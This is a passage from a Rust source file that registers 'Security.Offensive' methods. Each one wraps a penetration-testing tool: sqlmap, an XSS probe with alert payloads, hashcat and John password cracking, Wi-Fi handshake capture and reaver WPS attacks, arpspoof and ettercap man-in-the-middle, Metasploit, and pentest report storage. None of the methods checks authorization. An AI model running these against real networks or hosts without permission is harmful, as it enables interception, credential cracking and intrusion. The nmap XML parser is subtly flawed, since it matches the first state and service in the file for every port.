        )?;

        let options: Option<String> = params
            .as_ref()
                .and_then(|p| p.get("options").cloned())
                .and_then(|v| serde_json::from_value(v).ok());

        let mut cmd = vec!["sqlmap", "-u", &url, "--batch"];
        if let Some(ref opts) = options {
            for opt in opts.split_whitespace() {
                cmd.push(opt);
            }
        }

        let output = process::exec_command(&cmd).await?;
        Ok(serde_json::json!({ "output": output }))
    });

    registry.register("Security.Offensive.Web.XSS.Test", |params| async move {
        let url: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("url").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing url"))?,
        )?;

        let parameter: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("parameter").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing parameter"))?,
        )?;

        let test_payload = "<script>alert('XSS')</script>";
        let test_url = format!("{}?{}={}", url, parameter, test_payload);
        let response = reqwest::get(&test_url).await?;
        let body = response.text().await?;

        Ok(serde_json::json!({
            "vulnerable": body.contains("<script>alert('XSS')</script>"),
            "response": body
        }))
    });

    // ========================================================================
    // 6. PASSWORD SECURITY & CRACKING
    // ========================================================================

    registry.register("Security.Offensive.Password.Hashcat.Crack", |params| async move {
        let hash_file: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("hash_file").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing hash_file"))?,
        )?;

        let wordlist: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("wordlist").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing wordlist"))?,
        )?;

        let mode: Option<u32> = params
            .as_ref()
                .and_then(|p| p.get("mode").cloned())
                .and_then(|v| serde_json::from_value(v).ok());

        let mut cmd = vec!["hashcat", "-m"];
        let mode_str = if let Some(m) = mode {
            m.to_string()
        } else {
            "0".to_string() // MD5 default
        };
        cmd.push(&mode_str);
        cmd.extend_from_slice(&[&hash_file, &wordlist]);

        process::exec_command_detached(&cmd).await.ok();
        Ok(serde_json::json!({ "started": true }))
    });

    registry.register("Security.Offensive.Password.John.Crack", |params| async move {
        let hash_file: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("hash_file").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing hash_file"))?,
        )?;

        let wordlist: Option<String> = params
            .as_ref()
                .and_then(|p| p.get("wordlist").cloned())
                .and_then(|v| serde_json::from_value(v).ok());

        let mut cmd = vec!["john", &hash_file];
        if let Some(ref w) = wordlist {
            cmd.extend_from_slice(&["--wordlist", w]);
        }

        let output = process::exec_command(&cmd).await?;
        Ok(serde_json::json!({ "output": output }))
    });

    registry.register("Security.Offensive.Password.Hash.Identify", |params| async move {
        let hash: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("hash").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing hash"))?,
        )?;

        // Use hash-identifier or hashid
        let output = if process::exec_command(&["which", "hashid"]).await.is_ok() {
            process::exec_command(&["hashid", &hash]).await?
        } else {
            format!("Hash length: {}", hash.len())
        };

        Ok(serde_json::json!({ "output": output }))
    });

    // ========================================================================
    // 7. WIRELESS SECURITY
    // ========================================================================

    registry.register("Security.Offensive.Wireless.Scan", |params| async move {
        let interface: Option<String> = params
            .as_ref()
                .and_then(|p| p.get("interface").cloned())
                .and_then(|v| serde_json::from_value(v).ok());

        let iface = interface.unwrap_or_else(|| "wlan0".to_string());
        let output = process::exec_command(&["iwlist", &iface, "scan"]).await?;
        Ok(serde_json::json!({ "output": output }))
    });

    registry.register("Security.Offensive.Wireless.CaptureHandshake", |params| async move {
        let interface: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("interface").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing interface"))?,
        )?;

        let network: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("network").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing network"))?,
        )?;

        let output_file = format!("/tmp/handshake_{}.cap", chrono::Utc::now().timestamp_millis());
        let output = process::exec_command(&["airodump-ng", "-c", &network, "-w", &output_file, &interface]).await?;
        Ok(serde_json::json!({ "output": output, "file": output_file }))
    });

    // ========================================================================
    // 8. SOCIAL ENGINEERING TOOLS
    // ========================================================================

    registry.register("Security.Offensive.Social.QRCode.Generate", |params| async move {
        let url: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("url").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing url"))?,
        )?;

        let output_path: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("output_path").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing output_path"))?,
        )?;

        // Use qrencode
        process::exec_command(&["qrencode", "-o", &output_path, &url]).await?;
        Ok(serde_json::json!({ "success": true, "file": output_path }))
    });

    // ========================================================================
    // 9. FORENSICS & STEGANOGRAPHY
    // ========================================================================

    registry.register("Security.Offensive.Forensics.File.Strings", |params| async move {
        let file_path: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("file_path").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing file_path"))?,
        )?;

        let output = process::exec_command(&["strings", &file_path]).await?;
        Ok(serde_json::json!({ "strings": output }))
    });

    registry.register("Security.Offensive.Stego.Extract", |params| async move {
        let image_path: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("image_path").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing image_path"))?,
        )?;

        // Try steghide
        let output = if process::exec_command(&["which", "steghide"]).await.is_ok() {
            process::exec_command(&["steghide", "extract", "-sf", &image_path]).await?
        } else {
            "steghide not available".to_string()
        };

        Ok(serde_json::json!({ "output": output }))
    });

    // ========================================================================
    // 10. NETWORK ANALYSIS & TRAFFIC MANIPULATION
    // ========================================================================

    registry.register("Security.Offensive.Network.Tcpdump.Capture", |params| async move {
        let interface: Option<String> = params
            .as_ref()
                .and_then(|p| p.get("interface").cloned())
                .and_then(|v| serde_json::from_value(v).ok());

        let filter: Option<String> = params
            .as_ref()
                .and_then(|p| p.get("filter").cloned())
                .and_then(|v| serde_json::from_value(v).ok());

        let output: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("output").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing output"))?,
        )?;

        let mut cmd = vec!["tcpdump", "-w", &output];
        if let Some(ref i) = interface {
            cmd.push("-i");
            cmd.push(i);
        }
        if let Some(ref f) = filter {
            cmd.push(f);
        }

        process::exec_command_detached(&cmd).await.ok();
        Ok(serde_json::json!({ "started": true, "output": output }))
    });

    registry.register("Security.Offensive.Network.ArpSpoof", |params| async move {
        let target: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("target").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing target"))?,
        )?;

        let gateway: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("gateway").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing gateway"))?,
        )?;

        process::exec_command_detached(&["arpspoof", "-t", &target, &gateway]).await.ok();
        Ok(serde_json::json!({ "started": true }))
    });

    // ========================================================================
    // 11. SESSION & PROJECT MANAGEMENT
    // ========================================================================

    registry.register("Security.Offensive.Session.Create", |params| async move {
        let name: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("name").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing name"))?,
        )?;

        let target: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("target").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing target"))?,
        )?;

        let session_id = format!("session_{}", chrono::Utc::now().timestamp_millis());
        let session = OffensiveSession {
            session_id: session_id.clone(),
            name,
            target,
            created_at: chrono::Utc::now().timestamp_millis(),
            notes: Vec::new(),
            findings: Vec::new(),
        };

        let mut sessions = OFFENSIVE_SESSIONS.write().await;
        sessions.insert(session_id.clone(), session.clone());

        storage::init().await?;
        storage::set_kv("offensive_sessions", &session_id, &serde_json::to_value(&session)?).await?;

        Ok(serde_json::to_value(&session)?)
    });

    registry.register("Security.Offensive.Session.List", |_params| async move {
        let sessions = OFFENSIVE_SESSIONS.read().await;
        let session_list: Vec<&OffensiveSession> = sessions.values().collect();
        Ok(serde_json::to_value(session_list)?)
    });

    registry.register("Security.Offensive.Notes.Add", |params| async move {
        let note: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("note").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing note"))?,
        )?;

        let category: Option<String> = params
            .as_ref()
                .and_then(|p| p.get("category").cloned())
                .and_then(|v| serde_json::from_value(v).ok());

        storage::init().await?;
        let note_id = format!("note_{}", chrono::Utc::now().timestamp_millis());
        let note_data = serde_json::json!({
            "note": note,
            "category": category,
            "timestamp": chrono::Utc::now().timestamp_millis()
        });
        storage::set_kv("offensive_notes", &note_id, &note_data).await?;

        Ok(serde_json::json!({ "success": true, "note_id": note_id }))
    });

    registry.register("Security.Offensive.Screenshot.Capture", |params| async move {
        let url: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("url").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing url"))?,
        )?;

        let output_path: Option<String> = params
            .as_ref()
                .and_then(|p| p.get("output_path").cloned())
                .and_then(|v| serde_json::from_value(v).ok());

        let output = output_path.unwrap_or_else(|| format!("/tmp/screenshot_{}.png", chrono::Utc::now().timestamp_millis()));
        process::exec_command(&["cutycapt", "--url", &url, "--out", &output]).await?;

        Ok(serde_json::json!({ "success": true, "file": output }))
    });

    // ========================================================================
    // 12. REPORT GENERATION
    // ========================================================================

    registry.register("Security.Offensive.Report.Create", |params| async move {
        let session_id: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("session_id").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing session_id"))?,
        )?;

        let template: Option<String> = params
            .as_ref()
                .and_then(|p| p.get("template").cloned())
                .and_then(|v| serde_json::from_value(v).ok());

        let sessions = OFFENSIVE_SESSIONS.read().await;
        if let Some(session) = sessions.get(&session_id) {
            let report = serde_json::json!({
                "session_id": session_id,
                "session_name": session.name,
                "target": session.target,
                "findings": session.findings,
                "created_at": chrono::Utc::now().timestamp_millis(),
                "template": template
            });

            storage::init().await?;
            let report_id = format!("report_{}", chrono::Utc::now().timestamp_millis());
            storage::set_kv("offensive_reports", &report_id, &report).await?;

            Ok(serde_json::json!({ "success": true, "report_id": report_id }))
        } else {
            anyhow::bail!("Session not found")
        }
    });

    registry.register("Security.Offensive.Report.Export", |params| async move {
        let report_id: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("report_id").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing report_id"))?,
        )?;

        let format: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("format").cloned())
                .unwrap_or(serde_json::Value::String("markdown".to_string())),
        )?;

        storage::init().await?;
        if let Some(report_value) = storage::get_kv("offensive_reports", &report_id).await? {
            match format.as_str() {
                "markdown" => {
                    let markdown = format!("# Pentest Report\n\n{:?}", report_value);
                    Ok(serde_json::json!({ "markdown": markdown }))
                }
                "json" => Ok(report_value),
                _ => anyhow::bail!("Unsupported format")
            }
        } else {
            anyhow::bail!("Report not found")
        }
    });

    // Additional methods to complete the implementation
    registry.register("Security.Offensive.ExploitDB.SearchByCVE", |params| async move {
        let cve: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("cve").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing cve"))?,
        )?;

        let output = process::exec_command(&["searchsploit", "--json", &cve]).await?;
        Ok(serde_json::json!({ "output": output }))
    });

    registry.register("Security.Offensive.CVE.SearchByProduct", |params| async move {
        let product: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("product").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing product"))?,
        )?;

        let version: Option<String> = params
            .as_ref()
                .and_then(|p| p.get("version").cloned())
                .and_then(|v| serde_json::from_value(v).ok());

        let query = if let Some(ref v) = version {
            format!("{} {}", product, v)
        } else {
            product
        };

        let url = format!("https://cve.circl.lu/api/search/{}", query);
        let response = reqwest::get(&url).await?;
        let json: serde_json::Value = response.json().await?;

        Ok(json)
    });

    registry.register("Security.Offensive.Metasploit.UseModule", |params| async move {
        let module_path: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("module_path").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing module_path"))?,
        )?;

        let output = process::exec_command(&["msfconsole", "-q", "-x", &format!("use {}", module_path)]).await?;
        Ok(serde_json::json!({ "output": output }))
    });

    registry.register("Security.Offensive.Metasploit.Sessions", |_params| async move {
        let output = process::exec_command(&["msfconsole", "-q", "-x", "sessions"]).await?;
        Ok(serde_json::json!({ "output": output }))
    });

    registry.register("Security.Offensive.Web.XSS.Payload.Generate", |params| async move {
        let payload_type: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("type").cloned())
                .unwrap_or(serde_json::Value::String("basic".to_string())),
        )?;

        let payload = match payload_type.as_str() {
            "basic" => "<script>alert('XSS')</script>",
            "img" => "<img src=x onerror=alert('XSS')>",
            "svg" => "<svg onload=alert('XSS')>",
            _ => "<script>alert('XSS')</script>"
        };

        Ok(serde_json::json!({ "payload": payload }))
    });

    registry.register("Security.Offensive.Web.CSRF.Test", |params| async move {
        let url: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("url").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing url"))?,
        )?;

        let _action: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("action").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing action"))?,
        )?;

        // Check for CSRF token
        let response = reqwest::get(&url).await?;
        let body = response.text().await?;
        let has_csrf_token = body.contains("csrf") || body.contains("_token") || body.contains("authenticity_token");

        Ok(serde_json::json!({
            "vulnerable": !has_csrf_token,
            "has_protection": has_csrf_token
        }))
    });

    registry.register("Security.Offensive.Password.Wordlist.List", |_params| async move {
        let mut wordlists = Vec::new();
        let common_paths = vec![
            "/usr/share/wordlists",
            "/usr/share/seclists",
            "~/.local/share/wordlists",
        ];

        for path in common_paths {
            let expanded_path = path.replace("~", &std::env::var("HOME").unwrap_or_default());
            if let Ok(mut entries) = tokio::fs::read_dir(&expanded_path).await {
                while let Ok(Some(entry)) = entries.next_entry().await {
                    if let Ok(file_name) = entry.file_name().into_string() {
                        wordlists.push(file_name);
                    }
                }
            }
        }

        Ok(serde_json::to_value(&wordlists)?)
    });

    registry.register("Security.Offensive.Wireless.WPS.Test", |params| async move {
        let network: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("network").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing network"))?,
        )?;

        let output = process::exec_command(&["reaver", "-i", "wlan0", "-b", &network, "-vv"]).await?;
        Ok(serde_json::json!({ "output": output }))
    });

    registry.register("Security.Offensive.Forensics.File.Analyze", |params| async move {
        let file_path: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("file_path").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing file_path"))?,
        )?;

        let file_info = process::exec_command(&["file", &file_path]).await?;
        let md5 = process::exec_command(&["md5sum", &file_path]).await.ok();
        let sha256 = process::exec_command(&["sha256sum", &file_path]).await.ok();

        Ok(serde_json::json!({
            "file_info": file_info,
            "md5": md5,
            "sha256": sha256
        }))
    });

    registry.register("Security.Offensive.Network.Mitm.Start", |params| async move {
        let target: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("target").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing target"))?,
        )?;

        let interface: Option<String> = params
            .as_ref()
                .and_then(|p| p.get("interface").cloned())
                .and_then(|v| serde_json::from_value(v).ok());

        // Enable IP forwarding
        process::exec_command(&["sysctl", "-w", "net.ipv4.ip_forward=1"]).await.ok();

        // Start ettercap or bettercap
        let _iface = interface.unwrap_or_else(|| "eth0".to_string());
        process::exec_command_detached(&["ettercap", "-T", "-M", "arp", &format!("//{}", target)]).await.ok();

        Ok(serde_json::json!({ "started": true }))
    });

    registry.register("Security.Offensive.Session.Load", |params| async move {
        let session_id: String = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("session_id").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing session_id"))?,
        )?;

        storage::init().await?;
        if let Some(session_value) = storage::get_kv("offensive_sessions", &session_id).await? {
            let session: OffensiveSession = serde_json::from_value(session_value)?;
            let mut sessions = OFFENSIVE_SESSIONS.write().await;
            sessions.insert(session_id.clone(), session.clone());
            Ok(serde_json::to_value(&session)?)
        } else {
            anyhow::bail!("Session not found")
        }
    });

    registry.register("Security.Offensive.Report.AddFinding", |params| async move {
        let finding: Finding = serde_json::from_value(
            params
                .as_ref()
                .and_then(|p| p.get("finding").cloned())
                .ok_or_else(|| anyhow::anyhow!("Missing finding"))?,
        )?;

        // Add finding to current session or specified session
        let session_id: Option<String> = params
            .as_ref()
                .and_then(|p| p.get("session_id").cloned())
                .and_then(|v| serde_json::from_value(v).ok());

        if let Some(ref sid) = session_id {
            let mut sessions = OFFENSIVE_SESSIONS.write().await;
            if let Some(session) = sessions.get_mut(sid) {
                session.findings.push(finding.clone());
                storage::init().await?;
                storage::set_kv("offensive_sessions", sid, &serde_json::to_value(session)?).await?;
            }
        }

        Ok(serde_json::json!({ "success": true }))
    });
}

fn parse_nmap_xml(xml_content: &str) -> Result<Vec<NmapPort>> {
    let mut ports = Vec::new();
    
    // Simple XML parsing - extract port information
    // In production, use proper XML parser
    let port_re = regex::Regex::new(r#"<port protocol="(\w+)" portid="(\d+)">"#)?;
    let state_re = regex::Regex::new(r#"<state state="(\w+)""#)?;
    let service_re = regex::Regex::new(r#"<service name="([^"]+)""#)?;
    
    for cap in port_re.captures_iter(xml_content) {
        if let (Some(protocol), Some(port_str)) = (cap.get(1), cap.get(2)) {
            if let Ok(port) = port_str.as_str().parse::<u16>() {
                let mut state = "unknown".to_string();
                let mut service = "unknown".to_string();
                
                // Find state and service in nearby text
                if let Some(state_cap) = state_re.find(xml_content) {
                    state = state_cap.as_str().to_string();
                }
                if let Some(service_cap) = service_re.find(xml_content) {
                    service = service_cap.as_str().to_string();
                }
                
                ports.push(NmapPort {
                    port,
                    protocol: protocol.as_str().to_string(),
                    state,
                    service,
                    version: None,
                });
            }
        }
    }
    
    Ok(ports)
}
